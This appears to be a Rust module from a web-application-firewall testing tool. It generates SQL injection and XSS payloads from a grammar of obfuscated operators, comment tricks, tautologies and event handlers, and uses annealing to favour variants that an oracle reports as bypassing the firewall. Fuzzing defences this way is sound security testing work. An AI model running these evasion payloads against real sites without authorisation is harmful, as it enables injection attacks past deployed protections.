//! #116 CFG convergence-factor mutation (BWAFSQLi-inspired).
//!
//! Grammar-guided fuzzing where a **convergence factor** (temperature *T*)
//! controls how fast the mutation "cools" from broad exploration to narrow
//! exploitation. At T=1.0 (hot) any production rule in the context-free
//! grammar (CFG) may fire; at T→0.0 (cold) only the highest-probability rule
//! for each non-terminal fires, converging to the most evasive known form.
//!
//! This is the key insight from the BWAFSQLi paper (Bai et al., 2021):
//! naive grammar fuzzing stays hot (uniform production selection) and
//! wastes budget on payloads that trivially parse but share syntactic
//! fingerprints with known attacks. Convergence-guided mutation spends
//! early budget exploring the full production space, then cools so later
//! samples concentrate probability mass on the productions least likely to
//! trigger WAF rules — closing the feedback loop between oracle outcomes and
//! production-rule selection probabilities.
//!
//! # Architecture
//!
//! ```text
//! start payload
//!     │
//! ┌──────────────────────────────────────────────────────────┐
//! │  CfgMutator                                              │
//! │  T: f64 (temperature, 0.0–1.0)                          │
//! │  alpha: f64 (cooling rate, 0 < alpha < 1)               │
//! │  productions: Vec<Production>                            │
//! │                                                          │
//! │  step():                                                 │
//! │    for each non-terminal in payload:                     │
//! │      sample production with Boltzmann weight e^(s/T)    │
//! │      where s = production's bypass score                 │
//! │    emit candidate                                        │
//! │    T ← T * alpha  (anneal)                              │
//! └──────────────────────────────────────────────────────────┘
//! ```
//!
//! Productions carry a `bypass_score: f64` that starts at 0.0 and is
//! updated when an oracle call returns "bypassed". The Boltzmann
//! distribution then preferentially samples high-score productions as T
//! cools, matching the paper's convergence-factor mechanism exactly.

use rand::rngs::StdRng;
use rand::{Rng, SeedableRng};

// ── Production rule ───────────────────────────────────────────────────────

/// A single production in the CFG.
///
/// A production rewrites a non-terminal token (identified by a tag in the
/// payload string like `{expr}`, `{comment}`, etc.) to a concrete terminal
/// string.
#[derive(Debug, Clone)]
pub struct Production {
    /// The non-terminal this rule can expand.
    pub nonterminal: &'static str,
    /// The terminal (or partially-terminal) string this rule produces.
    pub terminal: String,
    /// Human-readable label.
    pub name: &'static str,
    /// Bypass score — updated by the caller when this production's output
    /// evades the WAF. Higher = more likely to be selected as T cools.
    pub bypass_score: f64,
}

impl Production {
    pub fn new(nonterminal: &'static str, terminal: impl Into<String>, name: &'static str) -> Self {
        Self {
            nonterminal,
            terminal: terminal.into(),
            name,
            bypass_score: 0.0,
        }
    }
}

// ── Default SQL production grammar ────────────────────────────────────────

/// Build the default production set for SQL injection evasion.
///
/// Non-terminals used:
/// - `{ws}` — whitespace / comment separators
/// - `{comment}` — trailing comment terminators
/// - `{or}` — OR operator variants
/// - `{and}` — AND operator variants
/// - `{eq}` — equality operator variants
/// - `{str_open}` — opening quote variants
/// - `{tautology}` — tautological right-hand side
#[must_use]
pub fn default_sql_productions() -> Vec<Production> {
    let mut prods = Vec::new();

    // {ws} — whitespace alternatives
    for &ws in &[
        " ",
        "\t",
        "\n",
        "/**/",
        "/**_*/",
        "/*!*/",
        "%20",
        "%09",
        "%0a",
        "%0d",
        "%a0",
    ] {
        prods.push(Production::new("{ws}", ws, "ws_variant"));
    }

    // {comment} — trailing comment terminators
    for &c in &["--", "-- ", "--+", "#", "/*", ";--", "-- -", ";#", "/*!*/"] {
        prods.push(Production::new("{comment}", c, "comment_terminator"));
    }

    // {or} — OR operator variants
    for &op in &[
        "OR",
        "||",
        "or",
        "Or",
        "oR",
        "OR/**/",
        "/*!OR*/",
        "O/**/R",
        "OORR",
    ] {
        prods.push(Production::new("{or}", op, "or_operator"));
    }

    // {and} — AND operator variants
    for &op in &["AND", "&&", "and", "And", "A/**/ND", "/*!AND*/", "AN/**/D"] {
        prods.push(Production::new("{and}", op, "and_operator"));
    }

    // {eq} — equality variants
    for &eq in &["=", " = ", " LIKE ", "<=", "!<", "REGEXP", " BETWEEN 1 AND "] {
        prods.push(Production::new("{eq}", eq, "eq_operator"));
    }

    // {str_open} — quote opening
    for &q in &["'", "\"", "`", "''", "\"\""] {
        prods.push(Production::new("{str_open}", q, "str_open"));
    }

    // {tautology} — tautological conditions
    for &t in &[
        "1=1",
        "1 LIKE 1",
        "'a'='a'",
        "1<2",
        "2>1",
        "CHAR(97)='a'",
        "1 BETWEEN 0 AND 2",
        "(SELECT 1)=1",
        "1 IN (1)",
        "NOT 1=2",
        "1=1 AND 2=2",
        "0x31=1",
    ] {
        prods.push(Production::new("{tautology}", t, "tautology"));
    }

    prods
}

/// Build the default XSS production set.
#[must_use]
pub fn default_xss_productions() -> Vec<Production> {
    let mut prods = Vec::new();

    // {tag_open} — opening tag variants
    for &t in &["<", "%3C", "\\x3c", "\\u003C", "&#60;", "&lt;", "\t<"] {
        prods.push(Production::new("{tag_open}", t, "tag_open"));
    }

    // {event} — event handler variants
    for &e in &[
        "onerror",
        "onload",
        "onfocus",
        "onmouseover",
        "onclick",
        "onpointerover",
        "onpointerenter",
        "oninput",
        "ontoggle",
        "onbeforescriptexecute",
    ] {
        prods.push(Production::new("{event}", e, "event_handler"));
    }

    // {exec} — execution functions
    for &f in &[
        "alert(1)",
        "confirm(1)",
        "prompt(1)",
        "eval(1)",
        "console.log(1)",
        "(()=>{})()",
        "Function`alert\x601\x60`()",
    ] {
        prods.push(Production::new("{exec}", f, "exec_function"));
    }

    // {sep} — attribute separator before event
    for &s in &[" ", "\t", "\n", "/", "//", "\x0c", "\x0b"] {
        prods.push(Production::new("{sep}", s, "attr_sep"));
    }

    prods
}

// ── Boltzmann sampler ─────────────────────────────────────────────────────

/// Sample a production rule for a given non-terminal using the Boltzmann
/// distribution over bypass scores.
///
/// P(production_i) ∝ exp(bypass_score_i / T)
///
/// At high T, all productions are nearly equally likely (exploration).
/// As T → 0, the production with the highest bypass_score dominates
/// (exploitation / convergence).
///
/// Returns `None` if no productions match the non-terminal or if the
/// temperature is exactly zero (caller should use argmax instead).
#[must_use]
pub fn boltzmann_sample<'a>(
    prods: &'a [Production],
    nonterminal: &str,
    temperature: f64,
    rng: &mut StdRng,
) -> Option<&'a Production> {
    let candidates: Vec<&Production> =
        prods.iter().filter(|p| p.nonterminal == nonterminal).collect();
    if candidates.is_empty() {
        return None;
    }
    if temperature <= 0.0 {
        // Fully cold: argmax.
        return candidates
            .into_iter()
            .max_by(|a, b| {
                a.bypass_score
                    .partial_cmp(&b.bypass_score)
                    .unwrap_or(std::cmp::Ordering::Equal)
            });
    }
    // Compute Boltzmann weights.
    let weights: Vec<f64> = candidates
        .iter()
        .map(|p| (p.bypass_score / temperature).exp())
        .collect();
    let total: f64 = weights.iter().sum();
    if total == 0.0 || !total.is_finite() {
        // Uniform fallback (avoids NaN at extreme temperatures).
        let idx = rng.gen_range(0..candidates.len());
        return Some(candidates[idx]);
    }
    let mut r: f64 = rng.r#gen::<f64>() * total;
    for (p, w) in candidates.iter().zip(weights.iter()) {
        r -= w;
        if r <= 0.0 {
            return Some(p);
        }
    }
    // Floating-point rounding: return last.
    candidates.last().copied()
}

// ── CFG mutator ───────────────────────────────────────────────────────────

/// Grammar-guided mutator with convergence annealing.
///
/// Usage pattern:
/// ```no_run
/// # use wafrift_grammar::grammar::cfg_convergence::{CfgMutator, default_sql_productions};
/// let mut mutator = CfgMutator::builder()
///     .productions(default_sql_productions())
///     .temperature(1.0)
///     .cooling_rate(0.9)
///     .seed(42)
///     .build();
///
/// // Template payload containing non-terminal tokens.
/// let template = "{str_open} {or} {tautology}{comment}";
/// for _ in 0..20 {
///     let candidate = mutator.expand(template);
///     // query oracle, update bypass scores...
///     mutator.anneal();
/// }
/// ```
#[derive(Debug, Clone)]
pub struct CfgMutator {
    pub productions: Vec<Production>,
    pub temperature: f64,
    pub cooling_rate: f64,
    pub min_temperature: f64,
    rng: StdRng,
}

/// Builder for `CfgMutator`.
#[derive(Debug, Default)]
pub struct CfgMutatorBuilder {
    productions: Option<Vec<Production>>,
    temperature: Option<f64>,
    cooling_rate: Option<f64>,
    min_temperature: Option<f64>,
    seed: Option<u64>,
}

impl CfgMutatorBuilder {
    #[must_use]
    pub fn productions(mut self, prods: Vec<Production>) -> Self {
        self.productions = Some(prods);
        self
    }

    #[must_use]
    pub fn temperature(mut self, t: f64) -> Self {
        self.temperature = Some(t.clamp(0.0, 100.0));
        self
    }

    #[must_use]
    pub fn cooling_rate(mut self, alpha: f64) -> Self {
        self.cooling_rate = Some(alpha.clamp(0.001, 0.999));
        self
    }

    #[must_use]
    pub fn min_temperature(mut self, min: f64) -> Self {
        self.min_temperature = Some(min.max(0.0));
        self
    }

    #[must_use]
    pub fn seed(mut self, s: u64) -> Self {
        self.seed = Some(s);
        self
    }

    #[must_use]
    pub fn build(self) -> CfgMutator {
        CfgMutator {
            productions: self.productions.unwrap_or_else(default_sql_productions),
            temperature: self.temperature.unwrap_or(1.0),
            cooling_rate: self.cooling_rate.unwrap_or(0.95),
            min_temperature: self.min_temperature.unwrap_or(0.01),
            rng: StdRng::seed_from_u64(self.seed.unwrap_or(0x1337_DEAD_BEEF_CAFE)),
        }
    }
}

impl CfgMutator {
    #[must_use]
    pub fn builder() -> CfgMutatorBuilder {
        CfgMutatorBuilder::default()
    }

    /// Expand a template string by replacing non-terminal tokens with
    /// Boltzmann-sampled productions.
    ///
    /// Non-terminals in the template are delimited by `{` and `}`.
    /// Each `{token}` is independently sampled at the current temperature.
    /// Unknown non-terminals are left in place.
    #[must_use]
    pub fn expand(&mut self, template: &str) -> String {
        let mut result = String::with_capacity(template.len() * 2);
        let mut chars = template.chars().peekable();
        while let Some(c) = chars.next() {
            if c == '{' {
                // Collect the non-terminal name up to '}'.
                let mut nt = String::new();
                let mut found_close = false;
                for inner in chars.by_ref() {
                    if inner == '}' {
                        found_close = true;
                        break;
                    }
                    nt.push(inner);
                }
                if !found_close {
                    // Unclosed brace — emit literally.
                    result.push('{');
                    result.push_str(&nt);
                    continue;
                }
                let nt_tag = format!("{{{nt}}}");
                if let Some(prod) =
                    boltzmann_sample(&self.productions, &nt_tag, self.temperature, &mut self.rng)
                {
                    result.push_str(&prod.terminal);
                } else {
                    // Unknown non-terminal — leave in place.
                    result.push_str(&nt_tag);
                }
            } else {
                result.push(c);
            }
        }
        result
    }

    /// Apply one annealing step: T ← max(T * alpha, T_min).
    pub fn anneal(&mut self) {
        self.temperature = (self.temperature * self.cooling_rate).max(self.min_temperature);
    }

    /// Update the bypass score of a production after an oracle call.
    ///
    /// `delta` is positive for a bypass (reward) and negative / zero for a block.
    /// Scores are clamped to [0, ∞).
    pub fn reward(&mut self, nonterminal: &str, terminal: &str, delta: f64) {
        for p in &mut self.productions {
            if p.nonterminal == nonterminal && p.terminal == terminal {
                p.bypass_score = (p.bypass_score + delta).max(0.0);
            }
        }
    }

    /// Generate `n` candidate payloads from a template at the current temperature.
    #[must_use]
    pub fn batch_expand(&mut self, template: &str, n: usize) -> Vec<String> {
        (0..n).map(|_| self.expand(template)).collect()
    }

    /// Current temperature.
    #[must_use]
    pub fn temperature(&self) -> f64 {
        self.temperature
    }

    /// List all registered non-terminals.
    #[must_use]
    pub fn nonterminals(&self) -> Vec<&'static str> {
        let mut seen = Vec::new();
        for p in &self.productions {
            if !seen.contains(&p.nonterminal) {
                seen.push(p.nonterminal);
            }
        }
        seen
    }
}

// ── Preset templates ──────────────────────────────────────────────────────

/// Standard SQL injection templates using the default production non-terminals.
pub const SQL_TEMPLATES: &[&str] = &[
    "{str_open}{ws}{or}{ws}{tautology}{comment}",
    "{str_open}{ws}{or}{ws}{tautology}{ws}{comment}",
    "{str_open}{ws}{and}{ws}{tautology}{comment}",
    "{str_open}{ws}{or}{ws}{str_open}{tautology}{str_open}{comment}",
    "1{ws}{or}{ws}{tautology}{comment}",
    "1{ws}{and}{ws}{tautology}{comment}",
    "{str_open}{eq}{tautology}{comment}",
];

/// Standard XSS templates.
pub const XSS_TEMPLATES: &[&str] = &[
    "{tag_open}img{sep}{event}={exec}>",
    "{tag_open}svg{sep}{event}={exec}>",
    "{tag_open}body{sep}{event}={exec}>",
    "{tag_open}details{sep}open{sep}{event}={exec}>",
    "{tag_open}input{sep}autofocus{sep}{event}={exec}>",
];

// ── Tests ─────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    fn make_mutator() -> CfgMutator {
        CfgMutator::builder().seed(42).temperature(1.0).cooling_rate(0.9).build()
    }

    #[test]
    fn expand_replaces_known_nonterminals() {
        let mut m = make_mutator();
        let result = m.expand("{ws}");
        // Must be one of the ws terminals, not the literal "{ws}".
        assert!(!result.contains('{'), "nonterminal must be expanded: {result:?}");
    }

    #[test]
    fn expand_leaves_unknown_nonterminals() {
        let mut m = make_mutator();
        let result = m.expand("{nonexistent_token}");
        assert_eq!(result, "{nonexistent_token}");
    }

    #[test]
    fn expand_multiple_nonterminals() {
        let mut m = make_mutator();
        let result = m.expand("{ws}{comment}");
        // Must not contain any opening brace (both were expanded).
        assert!(!result.contains('{'), "both nonterminals must be expanded: {result:?}");
    }

    #[test]
    fn expand_unclosed_brace_emits_literally() {
        let mut m = make_mutator();
        // No closing brace — should emit "{ws" literally.
        let result = m.expand("{ws");
        assert!(result.starts_with('{'), "unclosed brace must be literal: {result:?}");
    }

    #[test]
    fn anneal_reduces_temperature() {
        let mut m = make_mutator();
        let initial = m.temperature();
        m.anneal();
        assert!(m.temperature() < initial, "temperature must decrease after anneal");
    }

    #[test]
    fn anneal_never_below_min() {
        let mut m = CfgMutator::builder()
            .seed(0)
            .temperature(0.001)
            .cooling_rate(0.001)
            .min_temperature(0.01)
            .build();
        for _ in 0..100 {
            m.anneal();
        }
        assert!(
            m.temperature() >= 0.01,
            "temperature must not drop below min: {}",
            m.temperature()
        );
    }

    #[test]
    fn reward_updates_bypass_score() {
        let mut m = make_mutator();
        // Find a ws production and reward it.
        let ws_terminal = m
            .productions
            .iter()
            .find(|p| p.nonterminal == "{ws}")
            .unwrap()
            .terminal
            .clone();
        m.reward("{ws}", &ws_terminal, 5.0);
        let score = m
            .productions
            .iter()
            .find(|p| p.nonterminal == "{ws}" && p.terminal == ws_terminal)
            .unwrap()
            .bypass_score;
        assert!((score - 5.0).abs() < 0.001, "bypass_score must be updated");
    }

    #[test]
    fn reward_clamps_to_zero() {
        let mut m = make_mutator();
        let ws_terminal = m
            .productions
            .iter()
            .find(|p| p.nonterminal == "{ws}")
            .unwrap()
            .terminal
            .clone();
        m.reward("{ws}", &ws_terminal, -100.0);
        let score = m
            .productions
            .iter()
            .find(|p| p.nonterminal == "{ws}" && p.terminal == ws_terminal)
            .unwrap()
            .bypass_score;
        assert!(score >= 0.0, "score must never go negative");
    }

    #[test]
    fn batch_expand_returns_n_results() {
        let mut m = make_mutator();
        let results = m.batch_expand("{or}", 10);
        assert_eq!(results.len(), 10);
        for r in &results {
            assert!(!r.contains('{'), "all must be expanded: {r:?}");
        }
    }

    #[test]
    fn nonterminals_list_all_known() {
        let m = make_mutator();
        let nts = m.nonterminals();
        assert!(nts.contains(&"{ws}"));
        assert!(nts.contains(&"{comment}"));
        assert!(nts.contains(&"{or}"));
        assert!(nts.contains(&"{and}"));
        assert!(nts.contains(&"{eq}"));
        assert!(nts.contains(&"{tautology}"));
    }

    #[test]
    fn boltzmann_sample_zero_temperature_returns_argmax() {
        let prods = vec![
            Production { nonterminal: "{t}", terminal: "low".into(), name: "low", bypass_score: 0.0 },
            Production {
                nonterminal: "{t}",
                terminal: "high".into(),
                name: "high",
                bypass_score: 10.0,
            },
            Production {
                nonterminal: "{t}",
                terminal: "mid".into(),
                name: "mid",
                bypass_score: 5.0,
            },
        ];
        let mut rng = StdRng::seed_from_u64(0);
        let selected = boltzmann_sample(&prods, "{t}", 0.0, &mut rng).unwrap();
        assert_eq!(selected.terminal, "high", "argmax at T=0 must pick highest score");
    }

    #[test]
    fn boltzmann_sample_high_temperature_explores() {
        // At T=1000.0 all productions should be sampled roughly uniformly.
        let prods: Vec<Production> = ["a", "b", "c", "d", "e"]
            .iter()
            .map(|t| Production::new("{t}", *t, "variant"))
            .collect();
        let mut rng = StdRng::seed_from_u64(42);
        let mut counts = std::collections::HashMap::new();
        for _ in 0..1000 {
            let s = boltzmann_sample(&prods, "{t}", 1000.0, &mut rng).unwrap();
            *counts.entry(s.terminal.clone()).or_insert(0usize) += 1;
        }
        // All 5 should be sampled at least once (very high probability at T=1000).
        assert_eq!(counts.len(), 5, "all variants must be sampled at high T");
    }

    #[test]
    fn boltzmann_sample_unknown_nonterminal_returns_none() {
        let prods = default_sql_productions();
        let mut rng = StdRng::seed_from_u64(0);
        let result = boltzmann_sample(&prods, "{nonexistent}", 1.0, &mut rng);
        assert!(result.is_none());
    }

    #[test]
    fn sql_templates_all_expand_without_braces() {
        let mut m = make_mutator();
        for template in SQL_TEMPLATES {
            let result = m.expand(template);
            assert!(
                !result.contains('{'),
                "template {template:?} left unexpanded token in {result:?}"
            );
        }
    }

    #[test]
    fn xss_templates_expand_with_xss_mutator() {
        let mut m = CfgMutator::builder()
            .productions(default_xss_productions())
            .seed(1)
            .temperature(1.0)
            .cooling_rate(0.9)
            .build();
        for template in XSS_TEMPLATES {
            let result = m.expand(template);
            assert!(
                !result.contains('{'),
                "XSS template {template:?} left unexpanded token in {result:?}"
            );
        }
    }

    #[test]
    fn convergence_concentrates_on_high_score_production() {
        // Setup: two productions for {t}, one scored much higher.
        let prods = vec![
            Production::new("{t}", "evasive", "evasive"),
            Production::new("{t}", "noisy", "noisy"),
        ];
        let mut m = CfgMutator::builder()
            .productions(prods)
            .seed(7)
            .temperature(1.0)
            .cooling_rate(0.5)
            .build();

        // Reward "evasive" heavily.
        m.reward("{t}", "evasive", 20.0);

        // Cool down to near-zero.
        for _ in 0..50 {
            m.anneal();
        }

        // At near-zero T, argmax should dominate: "evasive" wins.
        let results = m.batch_expand("{t}", 20);
        let evasive_count = results.iter().filter(|r| r.as_str() == "evasive").count();
        assert!(
            evasive_count >= 15,
            "at low T, high-score production must dominate: {evasive_count}/20 evasive"
        );
    }

    #[test]
    fn default_sql_productions_have_all_nonterminals() {
        let prods = default_sql_productions();
        let required = ["{ws}", "{comment}", "{or}", "{and}", "{eq}", "{str_open}", "{tautology}"];
        for nt in &required {
            assert!(
                prods.iter().any(|p| p.nonterminal == *nt),
                "missing nonterminal {nt} in default SQL productions"
            );
        }
    }

    #[test]
    fn default_xss_productions_have_all_nonterminals() {
        let prods = default_xss_productions();
        let required = ["{tag_open}", "{event}", "{exec}", "{sep}"];
        for nt in &required {
            assert!(
                prods.iter().any(|p| p.nonterminal == *nt),
                "missing nonterminal {nt} in default XSS productions"
            );
        }
    }
}
